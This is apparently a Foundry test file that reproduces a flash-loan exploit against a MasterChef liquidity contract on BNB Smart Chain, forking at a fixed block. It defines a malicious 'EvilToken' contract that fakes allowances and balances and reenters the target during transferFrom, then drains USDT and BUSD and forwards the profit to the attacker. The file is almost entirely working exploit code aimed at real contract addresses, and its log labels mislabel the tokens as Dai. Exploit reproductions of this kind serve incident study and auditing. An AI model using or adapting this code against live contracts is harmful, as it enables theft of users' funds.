// SPDX-License-Identifier: UNLICENSED
// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!
pragma solidity >=0.7.0 <0.9.0;

import "forge-std/Test.sol";
import "./../interface.sol";

contract EvilToken {
    IMasterChef masterchef;
    IERC20 usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);

    constructor(
        IMasterChef _masterchef
    ) {
        masterchef = _masterchef;
    }

    function allowance(address owner, address spender) external view returns (uint256) {
        return 2 ** 256 - 1;
    }

    function balanceOf(
        address account
    ) external view returns (uint256) {
        return 1111;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (address(masterchef) != address(0) && address(msg.sender) != address(masterchef)) {
            usdt.approve(address(masterchef), 2 ** 256 - 1);
            busd.approve(address(masterchef), 2 ** 256 - 1);
            masterchef.depositByAddLiquidity(
                18, [address(usdt), address(busd)], [usdt.balanceOf(address(this)), busd.balanceOf(address(this))]
            );
        }
        return true;
    }

    function redeem() external {
        (uint256 _amount,) = masterchef.userInfo(18, address(this));
        masterchef.withdrawAndRemoveLiquidity(18, _amount, false);
        usdt.transfer(msg.sender, usdt.balanceOf(address(this)));
        busd.transfer(msg.sender, busd.balanceOf(address(this)));
    }
}

contract ContractTest is Test {
    IPancakePair pair = IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
    IERC20 usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IMasterChef masterchef = IMasterChef(0x633Fa755a83B015cCcDc451F82C57EA0Bd32b4B4);
    EvilToken token0;
    EvilToken token1;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 16_008_280); //fork bsc at block 16008280
    }

    function testExploit() public {
        token0 = new EvilToken(IMasterChef(address(0)));
        token1 = new EvilToken(masterchef);
        pair.swap(10_000 * 1e18, 10_000 * 1e18, address(this), new bytes(1));
        emit log_named_uint("Before exploit, Dai balance of attacker:", usdt.balanceOf(msg.sender));
        emit log_named_uint("After exploit, Dai balance of attacker:", busd.balanceOf(msg.sender));

        //iWithdraw.processExits(0x6B175474E89094C44Da98b954EedeAC495271d0F);
        //  emit log_named_uint("After exploit, Dai balance of attacker:",idai.balanceOf(msg.sender));
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        usdt.transfer(address(token1), usdt.balanceOf(address(this)));
        busd.transfer(address(token1), busd.balanceOf(address(this)));
        masterchef.depositByAddLiquidity(18, [address(token0), address(token1)], [uint256(1), uint256(1)]);
        (uint256 _amount,) = masterchef.userInfo(18, address(this));
        masterchef.withdrawAndRemoveLiquidity(18, _amount, false);
        address[] memory t = new address[](2);
        t[0] = address(busd);
        t[1] = address(usdt);
        masterchef.withdrawChange(t);
        token1.redeem();
        usdt.transfer(msg.sender, ((amount0 / 9975) * 10_000) + 10_000);
        busd.transfer(msg.sender, ((amount1 / 9975) * 10_000) + 10_000);
        usdt.transfer(tx.origin, usdt.balanceOf(address(this)));
        busd.transfer(tx.origin, busd.balanceOf(address(this)));
    }
}
